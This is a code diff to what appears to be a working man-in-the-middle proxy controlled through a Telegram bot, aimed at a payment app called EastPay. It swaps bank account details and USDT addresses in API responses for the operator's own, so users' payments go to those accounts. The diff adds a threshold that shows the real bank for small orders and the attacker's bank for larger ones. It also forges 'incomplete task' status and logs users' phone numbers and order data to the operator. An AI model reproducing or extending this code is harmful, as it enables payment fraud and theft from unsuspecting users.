@@ -247,7 +247,8 @@ function bankListText(d) {
   if (d.banks.length === 0) return 'No banks added yet.';
   return d.banks.map((b, i) => {
     const a = i === d.activeIndex ? ' ✅' : '';
-    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${a}`;
+    const minStr = b.minAmount ? ` | Min: ₹${b.minAmount}` : '';
+    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${minStr}${a}`;
   }).join('\n');
 }
 
@@ -458,6 +459,23 @@ function deepReplace(obj, bank, originalValues, depth) {
 
 let debugUsdtMode = false;
 
+function getOrderAmount(req, respData) {
+  if (respData && typeof respData === 'object') {
+    const amt = respData.orderAmount || respData.amount || respData.unpaidAmount || respData.totalAmount || respData.rechargeAmount;
+    if (amt !== undefined && amt !== null) {
+      const num = parseFloat(amt);
+      if (!isNaN(num)) return num;
+    }
+  }
+  const body = req && req.parsedBody ? req.parsedBody : {};
+  const bodyAmt = body.amount || body.orderAmount || body.totalAmount || body.rechargeAmount || body.money;
+  if (bodyAmt !== undefined && bodyAmt !== null) {
+    const num = parseFloat(bodyAmt);
+    if (!isNaN(num)) return num;
+  }
+  return null;
+}
+
 function applyUsdtReplacement(respBody, usdtAddress) {
   if (!usdtAddress || !respBody) return { replaced: false, body: respBody };
   const TRC20_RE = /T[a-zA-Z0-9]{33}/g;
@@ -546,7 +564,7 @@ app.post('/bot-webhook', async (req, res) => {
     if (text === '/start') {
       data.adminChatId = chatId;
       await saveData(data);
-      await bot.sendMessage(chatId, '🚀 EastPay (DSCHF) Proxy Bot Started!\n\nCommands:\n/status - Bot status\n/on - Enable proxy\n/off - Disable proxy\n/banks - List banks\n/addbank - Add bank\n/removebank - Remove bank\n/setbank - Set active bank\n/rotate - Toggle auto-rotate\n/log - Toggle logging\n/setusdt <address> - Set USDT address override\n/usdt - Show current USDT address\n/removeusdt - Remove USDT override\n/debugusdt - Toggle USDT debug logging\n/add <userId> <amount> - Add balance\n/deduct <userId> <amount> - Deduct balance\n/remove balance <userId> - Remove fake balance\n/history - Balance history\n/off log <userId> - Disable logging for user\n/on log <userId> - Enable logging for user\n/debug - Debug next response');
+      await bot.sendMessage(chatId, '🚀 EastPay (DSCHF) Proxy Bot Started!\n\nCommands:\n/status - Bot status\n/on - Enable proxy\n/off - Disable proxy\n/banks - List banks\n/addbank - Add bank\n/removebank - Remove bank\n/setbank - Set active bank\n/setmin <n> <amount> - Min order amount for bank\n/rotate - Toggle auto-rotate\n/log - Toggle logging\n/setusdt <address> - Set USDT address override\n/usdt - Show current USDT address\n/removeusdt - Remove USDT override\n/debugusdt - Toggle USDT debug logging\n/add <userId> <amount> - Add balance\n/deduct <userId> <amount> - Deduct balance\n/remove balance <userId> - Remove fake balance\n/history - Balance history\n/off log <userId> - Disable logging for user\n/on log <userId> - Enable logging for user\n/debug - Debug next response');
       return res.sendStatus(200);
     }
 
@@ -736,6 +754,23 @@ app.post('/bot-webhook', async (req, res) => {
       await saveData(data);
       const b = data.banks[idx];
       await bot.sendMessage(chatId, `✅ Active bank: ${b.accountHolder} | ${b.accountNo}`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/setmin ')) {
+      const parts = text.substring(8).trim().split(/\s+/);
+      if (parts.length < 2) { await bot.sendMessage(chatId, '❌ Format: /setmin <bank_number> <amount>\nExample: /setmin 1 500'); return res.sendStatus(200); }
+      const bankIdx = parseInt(parts[0]) - 1;
+      const amount = parseFloat(parts[1]);
+      if (isNaN(bankIdx) || bankIdx < 0 || bankIdx >= data.banks.length || isNaN(amount) || amount < 0) {
+        await bot.sendMessage(chatId, '❌ Format: /setmin <bank_number> <amount>\nExample: /setmin 1 500');
+        return res.sendStatus(200);
+      }
+      data.banks[bankIdx].minAmount = amount;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      const b = data.banks[bankIdx];
+      await bot.sendMessage(chatId, `✅ Min amount set!\nBank #${bankIdx + 1}: ${b.accountHolder}\nMin Order: ₹${amount}\n\nOrders < ₹${amount} → Real bank dikhega\nOrders >= ₹${amount} → Proxy bank dikhega`);
       return res.sendStatus(200);
     }
 
@@ -1152,32 +1187,11 @@ app.all('/app/bank/debit/update/switch', async (req, res) => {
 
 app.all('/app/pay/debit/task', async (req, res) => {
   try {
-    const data = await loadData();
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
     sendJson(res, respHeaders, jsonResp, respBody);
-    if (!isLogOff(data, userId) && data.adminChatId && bot) {
-      const respData = getResponseData(jsonResp);
-      const phone = getPhone(data, userId);
-      const statusCode = jsonResp ? (jsonResp.code ?? jsonResp.status ?? jsonResp.statusCode ?? '') : '';
-      const apiMsg = jsonResp ? (jsonResp.msg ?? jsonResp.message ?? '') : '';
-      const taskList = Array.isArray(respData) ? respData
-        : (respData && respData.list ? respData.list
-        : (respData && respData.records ? respData.records : null));
-      const taskCount = taskList ? taskList.length : '?';
-      const activeBank = getActiveBank(data, userId);
-      let taskMsg = `📋 Task [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}`;
-      taskMsg += `\n📊 Count: ${taskCount}${statusCode ? ' | Code: ' + statusCode : ''}${apiMsg ? ' | ' + apiMsg : ''}`;
-      if (activeBank) taskMsg += `\n🏦 Bank: ${activeBank.accountHolder} | ${activeBank.accountNo}`;
-      bot.sendMessage(data.adminChatId, taskMsg).catch(()=>{});
-    }
-  } catch(e) {
-    if (bot && (await loadData()).adminChatId) {
-      bot.sendMessage((await loadData()).adminChatId, `❌ Task ERROR: ${e.message}`).catch(()=>{});
-    }
-    await transparentProxy(req, res);
-  }
+  } catch(e) { await transparentProxy(req, res); }
 });
 
 app.all('/app/pay/debit/upis', async (req, res) => {
@@ -1240,7 +1254,52 @@ app.all('/app/pay/cancel/task', async (req, res) => {
 });
 
 app.all('/app/user/create/order', async (req, res) => {
-  await proxyAndReplaceBankDetails(req, res, '🛒 Create Order', true);
+  const data = await loadData();
+  const reqUserId = await extractUserId(req, null);
+  try {
+    const body = req.parsedBody || {};
+    const orderAmount = getOrderAmount(req, null);
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    if (userId) saveTokenUserId(req, userId);
+    const effectiveId = userId || reqUserId || '';
+    const respData = getResponseData(jsonResp);
+    const bank = await getActiveBankAndSave(data, effectiveId);
+    let shouldOverride = true;
+    if (bank && bank.minAmount && orderAmount !== null) {
+      if (orderAmount < bank.minAmount) shouldOverride = false;
+    }
+    if (bank && shouldOverride && jsonResp) deepReplace(jsonResp, bank, {}, 0);
+    let finalBody = JSON.stringify(jsonResp) || respBody;
+    if (data.usdtAddress) {
+      const ur = applyUsdtReplacement(finalBody, data.usdtAddress);
+      if (ur.replaced) finalBody = ur.body;
+    }
+    respHeaders['content-type'] = 'application/json; charset=utf-8';
+    respHeaders['content-length'] = String(Buffer.byteLength(finalBody));
+    respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
+    delete respHeaders['etag']; delete respHeaders['last-modified'];
+    res.writeHead(200, respHeaders);
+    res.end(finalBody);
+    if (!isLogOff(data, effectiveId) && data.adminChatId && bot) {
+      const phone = getPhone(data, effectiveId);
+      const statusCode = jsonResp ? (jsonResp.code ?? jsonResp.status ?? '') : '';
+      const success = statusCode === 200 || statusCode === '200' || statusCode === 0 || statusCode === '0';
+      const orderId = (respData && (respData.orderId || respData.orderNo)) || 'N/A';
+      let msg = `🛒 Buy Order [${effectiveId || 'N/A'}]${phone ? ' 📱' + phone : ''}`;
+      if (orderAmount !== null) msg += `\n💰 Amount: ₹${orderAmount}`;
+      if (!shouldOverride && bank) {
+        msg += `\n⚠️ ₹${orderAmount} < Min ₹${bank.minAmount} → Real Bank`;
+      } else if (bank && shouldOverride) {
+        msg += `\n🏦 Bank: ${bank.accountHolder} | ${bank.accountNo}`;
+        if (bank.ifsc) msg += ` | ${bank.ifsc}`;
+      }
+      if (orderId !== 'N/A') msg += `\n📋 Order: ${orderId}`;
+      msg += `\n${success ? '✅ Success' : '❌ Failed (Code: ' + statusCode + ')'}`;
+      bot.sendMessage(data.adminChatId, msg).catch(()=>{});
+    }
+    if (effectiveId) trackUser(data, effectiveId, 'Buy Order');
+  } catch(e) { await transparentProxy(req, res); }
 });
 
 app.all('/app/user/get/order', async (req, res) => {
@@ -1338,6 +1397,28 @@ app.all('/app/user/update/pass', async (req, res) => {
   } catch(e) { await transparentProxy(req, res); }
 });
 
+app.all('/app/pay/exist/incomplete/task', async (req, res) => {
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    if (userId) saveTokenUserId(req, userId);
+    if (jsonResp) {
+      if (jsonResp.data === true || jsonResp.data > 0) {
+        jsonResp.data = false;
+      } else if (jsonResp.data && typeof jsonResp.data === 'object') {
+        if (jsonResp.data.exist !== undefined) jsonResp.data.exist = false;
+        if (jsonResp.data.count !== undefined) jsonResp.data.count = 0;
+        if (jsonResp.data.hasTask !== undefined) jsonResp.data.hasTask = false;
+        if (jsonResp.data.incompleteCount !== undefined) jsonResp.data.incompleteCount = 0;
+      }
+      sendJson(res, respHeaders, jsonResp, respBody);
+    } else {
+      res.writeHead(response.status, respHeaders);
+      res.end(respBody);
+    }
+  } catch(e) { await transparentProxy(req, res); }
+});
+
 const COLLECTION_ENDPOINTS = [
   '/app/collectionbank/', '/app/collectionbank_bills/',
   '/app/collectiontool/', '/app/collectiontool_bills/', '/app/collectiontool_stats/',
@@ -1396,7 +1477,7 @@ const LOG_ONLY_ENDPOINTS = [
   '/app/user/revenue/record', '/app/user/sub/detail',
   '/app/user/telegram/bind/info', '/app/user/telegram/unbind',
   '/app/user/update/whatsapp',
-  '/app/pay/exist/incomplete/task', '/app/pay/user/task/list', '/app/pay/user/task/success',
+  '/app/pay/user/task/list', '/app/pay/user/task/success',
   '/app/game/list', '/app/game/history', '/app/game/billing',
   '/app/game/get/balance', '/app/game/transfer/in', '/app/game/transfer/out',
   '/app/game/bet', '/app/game/notice',
